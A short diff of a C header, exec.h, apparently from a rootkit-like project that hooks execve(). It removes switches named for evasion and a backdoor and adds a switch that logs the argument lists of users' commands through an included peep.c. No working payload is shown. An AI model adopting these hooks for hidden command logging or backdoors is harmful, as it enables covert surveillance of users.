@@ -1,15 +1,10 @@
 #ifndef EXEC_H
 #define EXEC_H
 
-#ifdef DO_EVASIONS
-#define CANTEVADE_ERR EPERM
+#ifdef LOG_USER_EXEC
+void peepargv(char *const argv[]);
+#include "peep.c"
 #endif
-
-
-#ifdef BACKDOOR_UTIL
-#include "magic/magic.h"
-#endif
-
 
 
 int execve(const char *filename, char *const argv[], char *const envp[]);
